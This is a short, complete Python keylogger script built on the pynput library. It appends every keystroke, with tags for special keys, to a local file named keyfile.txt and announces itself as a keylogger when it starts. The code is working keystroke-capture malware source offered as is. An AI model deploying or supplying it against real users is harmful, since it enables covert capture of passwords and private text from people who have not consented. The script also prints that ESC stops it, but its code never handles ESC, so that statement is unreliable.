from pynput import keyboard

def keyPressed(key):
    try:
        with open("keyfile.txt", 'a') as logKey:
            if hasattr(key, 'char') and key.char:
                logKey.write(key.char)
            else:
                if key == keyboard.Key.space:
                    logKey.write(' [SPACE] ')
                elif key == keyboard.Key.enter:
                    logKey.write(' [ENTER]\n')
                elif key == keyboard.Key.backspace:
                    logKey.write(' [BACKSPACE] ')
                elif key == keyboard.Key.shift:
                    logKey.write(' [Shift] ')
                else:
                    logKey.write(f' [{key}] ')
            logKey.flush()  # Force write to file
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print("Keylogger running... Press ESC to stop.")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
